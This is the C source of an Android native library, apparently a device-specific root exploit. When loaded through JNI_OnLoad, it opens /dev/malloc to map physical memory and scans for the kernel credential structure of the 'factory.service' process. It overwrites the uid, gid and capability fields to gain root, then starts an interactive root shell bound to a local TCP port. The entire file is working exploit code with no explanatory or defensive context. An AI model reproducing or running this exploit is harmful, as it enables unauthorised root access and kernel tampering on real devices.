typedef unsigned char u8; typedef unsigned int u32; typedef unsigned int uint; typedef unsigned long long u64;
#define SYS_open 5
#define SYS_ioctl 54
#define SYS_mmap2 192
#define SYS_munmap 91
#define SYS_write 4
#define SYS_fork 2
#define SYS_wait4 114
#define SYS_exit 1
#define SYS_getuid 199
#define SYS_setsid 66
#define SYS_socket 281
#define SYS_bind 282
#define SYS_listen 284
#define SYS_accept 285
#define SYS_dup2 63
#define SYS_execve 11
static long sc(long n,long a,long b,long c,long d,long e,long f){register long r7 __asm__("r7")=n;register long r0 __asm__("r0")=a;register long r1 __asm__("r1")=b;register long r2 __asm__("r2")=c;register long r3 __asm__("r3")=d;register long r4 __asm__("r4")=e;register long r5 __asm__("r5")=f;__asm__ volatile("svc 0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");return r0;}
static long lg=-1;static void put(const char*s){int n=0;while(s[n])n++;if(lg>=0)sc(SYS_write,lg,(long)s,n,0,0,0);}
static void hx(u64 v){char b[19];int i;for(i=0;i<16;i++){int d=(v>>((15-i)*4))&15;b[i]=d<10?48+d:87+d;}b[16]=10;b[17]=0;put(b);}
static void dec(long v){char b[24];int i=23;b[23]=0;if(v==0){put("0");return;}int neg=0;if(v<0){neg=1;v=-v;}while(v){b[--i]=48+v%10;v/=10;}if(neg)b[--i]=45;put(b+i);}
static int mcmp(const unsigned char*a,const unsigned char*b,int n){int i;for(i=0;i<n;i++)if(a[i]!=b[i])return 1;return 0;}
struct info{u64 addr,size,interval;u8 miusel;u8 pad[7];};
#define PAGE_OFFSET 0xffffffc000000000ULL
#define MEMSTART 0x20000000ULL
static unsigned long mp(long fd,u64 phys,u64 size){if(phys<0x20000000ULL)return 0;struct info in;in.addr=phys-0x20000000ULL;in.size=size;in.interval=0;in.miusel=0;in.pad[0]=0;if(sc(SYS_ioctl,fd,0x80204d04u,(long)&in,0,0,0))return 0;long p=sc(SYS_mmap2,0,size,3,1,fd,0);if((unsigned long)p>=0xfffff000UL)return 0;return p;}
struct sockaddr_in { unsigned short sin_family; unsigned short sin_port; unsigned int sin_addr; unsigned char pad[8]; };
static void server(void){
 put("SERVER uid=");dec(sc(SYS_getuid,0,0,0,0,0,0));put("\n");
 int s=sc(SYS_socket,2,1,0,0,0,0); put("sock=");dec(s);put("\n"); if(s<0)return;
 struct sockaddr_in a; int i; unsigned char *p=(unsigned char*)&a; for(i=0;i<16;i++)p[i]=0;
 a.sin_family=2; a.sin_port=0x5d11; a.sin_addr=0x0100007f;
 int r=sc(SYS_bind,s,(long)&a,16,0,0,0); put("bind=");dec(r);put("\n"); if(r<0)return;
 r=sc(SYS_listen,s,1,0,0,0,0); put("listen=");dec(r);put("\n"); if(r<0)return;
 int c=sc(SYS_accept,s,0,0,0,0,0); put("accept=");dec(c);put("\n"); if(c<0)return;
 sc(SYS_dup2,c,0,0,0,0,0); sc(SYS_dup2,c,1,0,0,0,0); sc(SYS_dup2,c,2,0,0,0,0);
 char *argv[3]; argv[0]=(char*)"/system/bin/sh"; argv[1]=(char*)"-i"; argv[2]=0;
 char *envp[4]; envp[0]=(char*)"PATH=/sbin:/system/sbin:/system/bin:/system/xbin"; envp[1]=(char*)"HOME=/"; envp[2]=(char*)"TERM=xterm"; envp[3]=0;
 sc(SYS_execve,(long)"/system/bin/sh",(long)argv,(long)envp,0,0,0);
}
static int hit(long fd,u64 cp){
 unsigned long p=mp(fd,cp&~0xfffULL,0x1000);
 if(!p)return 0;
 u8 *b=(u8*)p; int off,found=-1;
 for(off=0;off<0xf00;off+=4){ if(*(u32*)(b+off)==1000 && *(u32*)(b+off+4)==1000){found=off;break;} }
 put("UIDOFF ");dec(found);put(" cp ");hx(cp);put("\n");
 if(found<0){sc(SYS_munmap,p,0x1000,0,0,0,0);return 0;}
 static u8 save[0x1000]; int k; for(k=0;k<0x1000;k++)save[k]=b[k];
 for(k=0;k<8;k++)*(u32*)(b+found+k*4)=0;
 *(u32*)(b+found+32)=0;
 for(k=36;k<76;k+=4)*(u32*)(b+found+k)=0xffffffffu;
 put("after ");dec(sc(SYS_getuid,0,0,0,0,0,0));put("\n");
 if(sc(SYS_getuid,0,0,0,0,0,0)!=0){for(k=0;k<0x1000;k++)b[k]=save[k];sc(SYS_munmap,p,0x1000,0,0,0,0);return 0;}
 sc(SYS_munmap,p,0x1000,0,0,0,0);server();return 1;
}
static void child(long fd,u64 base,u64 size){
 unsigned long p=mp(fd,base,size);if(!p)sc(SYS_exit,2,0,0,0,0,0);
 u8 *b=(u8*)p;u64 i;
 for(i=8;i+15<size;i++){
  if(mcmp(b+i,(const unsigned char*)"factory.service",15))continue;
  u64 cp=*(u64*)(b+i-8);u64 rc=*(u64*)(b+i-16);
  if(cp!=rc||cp<PAGE_OFFSET||cp>=PAGE_OFFSET+0x92000000ULL)continue;
  u64 cpys=cp-PAGE_OFFSET+MEMSTART;
  if(cpys<0x20000000ULL||cpys>=0x92000000ULL)continue;
  put("HIT ");hx(base+i);put(" cp ");hx(cp);put("\n");
  if(hit(fd,cpys)){put("SUCCESS\n");sc(SYS_exit,42,0,0,0,0,0);}
 }
 sc(SYS_munmap,p,size,0,0,0,0);sc(SYS_exit,1,0,0,0,0,0);
}
static void scan_ranges(long fd){
 u64 base;int n=0;
 for(base=0x20000000ULL;base<0x60000000ULL;base+=0x200000ULL){
  long pid=sc(SYS_fork,0,0,0,0,0,0);if(pid==0)child(fd,base,0x200000ULL);
  int st=0;sc(SYS_wait4,pid,(long)&st,0,0,0,0);
  if((st&0x7f)==0&&((st>>8)&0xff)==42){put("ROOT\n");break;}
  if((n++%64)==0){put("chunk ");hx(base);put(" st ");dec(st);put("\n");}
  if(sc(SYS_getuid,0,0,0,0,0,0)==0){put("ROOT2\n");break;}
 }
}
__attribute__((visibility("default"))) int JNI_OnLoad(void*a,void*b){
 lg=sc(SYS_open,(long)"/data/data/com.cvte.factory.service/files/rootshell.log",0x241,0644,0,0,0);
 put("start uid=");dec(sc(SYS_getuid,0,0,0,0,0,0));put("\n");
 long fd=sc(SYS_open,(long)"/dev/malloc",2,0,0,0,0);put("fd=");dec(fd);put("\n");if(fd<0)return 0x10006;
 long pid=sc(SYS_fork,0,0,0,0,0,0);
 if(pid==0){ sc(SYS_setsid,0,0,0,0,0,0); scan_ranges(fd); sc(SYS_exit,0,0,0,0,0,0); }
 put("forked\n");return 0x10006;
}
